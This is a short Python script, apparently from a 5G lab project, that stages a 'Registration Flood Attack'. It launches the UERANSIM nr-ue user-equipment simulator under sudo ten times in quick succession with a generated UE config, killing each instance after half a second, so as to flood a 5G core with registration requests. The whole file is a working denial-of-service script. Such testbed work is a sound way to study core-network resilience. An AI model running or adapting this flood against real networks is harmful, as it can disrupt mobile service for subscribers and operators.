import subprocess
import time
from pathlib import Path

UERANSIM = Path.home() / "5g-project" / "UERANSIM"

NR_UE = UERANSIM / "build" / "nr-ue"

CONFIG = UERANSIM / "config" / "generated" / "ue001.yaml"

ATTEMPTS = 10

print("Authenticating sudo...")
subprocess.run(["sudo", "-v"], check=True)

print("=" * 60)
print("Registration Flood Attack")
print("=" * 60)

for i in range(ATTEMPTS):

    print(f"Flood Registration {i+1}/{ATTEMPTS}")

    p = subprocess.Popen([
        "sudo",
        "-n",
        str(NR_UE),
        "-c",
        str(CONFIG)
    ])

    # very small delay
    time.sleep(0.5)

    subprocess.run([
        "sudo",
        "pkill",
        "-f",
        "nr-ue"
    ])

    time.sleep(0.2)

print()
print("Flood attack completed.")